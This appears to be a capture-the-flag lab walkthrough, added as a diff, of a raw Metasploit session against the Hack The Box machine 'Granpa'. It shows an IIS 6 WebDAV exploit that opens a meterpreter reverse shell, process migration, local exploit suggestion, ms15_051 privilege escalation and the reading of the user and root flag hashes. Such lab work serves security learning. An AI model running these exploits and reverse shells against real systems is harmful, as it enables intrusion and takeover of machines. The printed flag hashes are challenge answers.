@@ -95,3 +95,292 @@ Network Card(s):           N/A
 ==============================
 The churasco vulnerability will definitely work to get admin privileges as in granny box
 =======================================================
+MSFCONSOLE
+===================================================
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 1
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > options
+
+Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   MAXPATHLENGTH  60               yes       End of physical path brute force
+   MINPATHLENGTH  3                yes       Start of physical path brute forc
+                                             e
+   Proxies                         no        A proxy chain of format type:host
+                                             :port[,type:host:port][...]
+   RHOSTS                          yes       The target host(s), range CIDR id
+                                             entifier, or hosts file with synt
+                                             ax 'file:<path>'
+   RPORT          80               yes       The target port (TCP)
+   SSL            false            no        Negotiate SSL/TLS for outgoing co
+                                             nnections
+   TARGETURI      /                yes       Path of IIS 6 web application
+   VHOST                           no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thr
+                                        ead, process, none)
+   LHOST     192.168.4.71     yes       The listen address (an interface may b
+                                        e specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Windows Server 2003 R2 SP2 x86
+
+
+msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST 10.10.14.9LHOST => 10.10.14.9
+msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
+RHOSTS => 10.10.10.14
+msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run
+
+[*] Started reverse TCP handler on 10.10.14.9:4444 
+[*] Trying path length 3 to 60 ...
+[*] Sending stage (175174 bytes) to 10.10.10.14
+[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.10.14:1030) at 2021-06-04 07:28:03 +0300
+
+meterpreter > shell
+[-] Failed to spawn shell with thread impersonation. Retrying without it.
+Process 2516 created.
+Channel 2 created.
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+c:\windows\system32\inetsrv>sysinfo
+sysinfo
+'sysinfo' is not recognized as an internal or external command,
+operable program or batch file.
+
+c:\windows\system32\inetsrv>systeminfo
+systeminfo
+
+Host Name:                 GRANPA
+OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
+OS Version:                5.2.3790 Service Pack 2 Build 3790
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Uniprocessor Free
+Registered Owner:          HTB
+Registered Organization:   HTB
+Product ID:                69712-296-0024942-44782
+Original Install Date:     4/12/2017, 5:07:40 PM
+System Up Time:            0 Days, 0 Hours, 1 Minutes, 59 Seconds
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              INTEL  - 6040000
+Windows Directory:         C:\WINDOWS
+System Directory:          C:\WINDOWS\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
+Total Physical Memory:     1,023 MB
+Available Physical Memory: 791 MB
+Page File: Max Size:       2,470 MB
+Page File: Available:      2,324 MB
+Page File: In Use:         146 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 1 Hotfix(s) Installed.
+                           [01]: Q147222
+Network Card(s):           N/A
+
+c:\windows\system32\inetsrv>exit
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name         Arch  Session  User               Path
+ ---   ----  ----         ----  -------  ----               ----
+ 0     0     [System Pro
+             cess]
+ 4     0     System
+ 272   4     smss.exe
+ 324   272   csrss.exe
+ 348   272   winlogon.ex
+             e
+ 396   348   services.ex
+             e
+ 408   348   lsass.exe
+ 588   396   svchost.exe
+ 680   396   svchost.exe
+ 736   396   svchost.exe
+ 764   396   svchost.exe
+ 800   396   svchost.exe
+ 936   396   spoolsv.exe
+ 964   396   msdtc.exe
+ 1076  396   cisvc.exe
+ 1116  396   svchost.exe
+ 1176  396   inetinfo.ex
+             e
+ 1216  396   svchost.exe
+ 1328  396   VGAuthServi
+             ce.exe
+ 1408  396   vmtoolsd.ex
+             e
+ 1456  396   svchost.exe
+ 1636  396   alg.exe
+ 1676  396   svchost.exe
+ 1772  396   dllhost.exe
+ 1828  588   wmiprvse.ex  x86   0        NT AUTHORITY\NETW  C:\WINDOWS\system3
+             e                           ORK SERVICE        2\wbem\wmiprvse.ex
+                                                            e
+ 1908  396   dllhost.exe
+ 2108  396   vssvc.exe
+ 2180  1456  w3wp.exe     x86   0        NT AUTHORITY\NETW  c:\windows\system3
+                                         ORK SERVICE        2\inetsrv\w3wp.exe
+ 2248  588   davcdata.ex  x86   0        NT AUTHORITY\NETW  C:\WINDOWS\system3
+             e                           ORK SERVICE        2\inetsrv\davcdata
+                                                            .exe
+ 2328  2180  rundll32.ex  x86   0                           C:\WINDOWS\system3
+             e                                              2\rundll32.exe
+ 2472  588   wmiprvse.ex
+             e
+ 2780  588   wmiprvse.ex
+             e
+
+meterpreter > migrate 1828
+[*] Migrating from 2328 to 1828...
+[*] Migration completed successfully.
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+[*] 10.10.10.14 - Collecting local exploits for x86/windows...
+[*] 10.10.10.14 - 38 exploit checks are being tried...
+[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use exploit/windows/local/ms15_051_client_copy_image
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms15_051_client_copy_image) > options
+
+Module options (exploit/windows/local/ms15_051_client_copy_image):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, th
+                                        read, process, none)
+   LHOST     192.168.4.71     yes       The listen address (an interface may
+                                        be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                  Information           Connection
+  --  ----  ----                  -----------           ----------
+  1         meterpreter x86/wind  NT AUTHORITY\NETWORK  10.10.14.9:4444 -> 10
+            ows                    SERVICE @ GRANPA     .10.10.14:1030 (10.10
+                                                        .10.14)
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
+session => 1
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms15_051_client_copy_image) > show options
+
+Module options (exploit/windows/local/ms15_051_client_copy_image):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, th
+                                        read, process, none)
+   LHOST     192.168.4.71     yes       The listen address (an interface may
+                                        be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST 10.10.14.9
+LHOST => 10.10.14.9
+msf6 exploit(windows/local/ms15_051_client_copy_image) > run
+
+[*] Started reverse TCP handler on 10.10.14.9:4444 
+[*] Launching notepad to host the exploit...
+[+] Process 2908 launched.
+[*] Reflectively injecting the exploit DLL into 2908...
+[*] Injecting exploit into 2908...
+[*] Exploit injected. Injecting payload into 2908...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (175174 bytes) to 10.10.10.14
+[*] Meterpreter session 2 opened (10.10.14.9:4444 -> 10.10.10.14:1031) at 2021-06-04 07:35:37 +0300
+
+meterpreter > shell
+Process 3008 created.
+Channel 1 created.
+cMicrosoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+C:\WINDOWS\system32>cd ../../ 
+ccd ../../
+'ccd' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\WINDOWS\system32>cd ../../
+cd ../../
+
+C:\>cd Documents and Settings
+cd Documents and Settings
+
+C:\Documents and Settings>cd Harry/Desktop
+cd Harry/Desktop
+
+C:\Documents and Settings\Harry\Desktop>type user.txt
+type user.txt
+bdff5ec67c3cff017f2bedc146a5d869
+C:\Documents and Settings\Harry\Desktop>cd ../../Administrator/desktop
+cd ../../Administrator/desktop
+
+C:\Documents and Settings\Administrator\Desktop>type root.txt
+type root.txt
+9359e905a2c35f861f6a57cecf28bb7b
